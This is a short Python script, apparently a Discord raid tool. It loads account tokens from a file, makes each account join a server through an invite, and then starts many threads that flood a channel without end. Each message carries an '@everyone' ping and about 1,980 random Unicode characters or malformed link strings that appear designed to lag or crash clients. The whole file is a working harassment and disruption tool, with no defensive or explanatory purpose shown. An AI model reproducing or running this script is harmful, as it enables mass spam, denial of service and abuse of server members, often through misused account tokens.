import requests, random, sys
from threading import Thread

TOKENLST = []
INVITE = sys.argv[1]
ID = sys.argv[2]
THREADS = int(sys.argv[3])

def randascii(length):
    return ''.join(chr(random.randrange(13000)) for _ in range(length))

def join_guild():
    for tokens in TOKENLST:
        head = {"content-type": "application/json", "Authorization": tokens}

        try:
            data = requests.post(url=f"https://discordapp.com/api/v6/invite/{INVITE}?with_counts=true", headers=head)
            print(f"Sent join request [{ID} | {tokens} | {data}]")
        except:
            print("Error sending request.")

def uri():
    chars = ''.join(random.choice('\'"^`|{}') for _ in range(1980))
    return f'<a://a{chars}>'

def send_msg():
    while True:
        for tokens in TOKENLST:
            head = {'Authorization':tokens,'Content-Type':'application/json'
            }
            try:
                data = requests.post(url=f"https://discord.com/api/v8/channels/{ID}/messages", headers=head, json={"content": "@everyone"+randascii(1980)})
                print(f"Sent message request (ascii) [{ID} | {tokens} | {data}]")
            except:
                print("Error sending request.")
            
            try:
                data = requests.post(url=f"https://discord.com/api/v8/channels/{ID}/messages", headers=head, json={"content": "@everyone"+uri()})
                print(f"Sent message request (charex) [{ID} | {tokens} | {data}]")
            except:
                print("Error sending request.")

def main():
    with open("tokens.txt") as f:
        content = f.readlines()
    
    for x in content:
        TOKENLST.append(x.strip())

    for _ in range(5):
        Thread(target=join_guild).start()

    for _ in range(THREADS):
        Thread(target=send_msg).start()

if __name__ == "__main__":
    main()